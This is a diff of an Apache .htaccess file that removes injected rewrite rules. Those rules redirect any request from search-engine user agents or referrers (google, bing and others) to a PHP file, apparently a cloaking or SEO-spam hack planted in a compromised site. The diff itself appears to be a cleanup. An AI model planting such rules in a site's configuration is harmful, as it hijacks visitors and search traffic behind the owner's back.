@@ -1,12 +1,4 @@
-RewriteEngine On
 
-RewriteBase /
-
-RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
-
-RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
-
-RewriteRule . bestubble-intents.php [L]
 
 
 Options +FollowSymLinks
@@ -17,11 +9,6 @@ RewriteEngine On
 #RewriteCond %{HTTPS} off
 #RewriteRule (.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
 
-
-#RewriteEngine On
-#RewriteCond %{HTTPS} off
-#RewriteCond %{HTTP_HOST} ^(sedonasecret7map.com(\/{0,1})){1}$
-#RewriteRule ^ http://%{HTTP_HOST}%{REQUEST_URI} [NE,L,R=301]
 
 # force http because of ssl issues
 RewriteEngine On
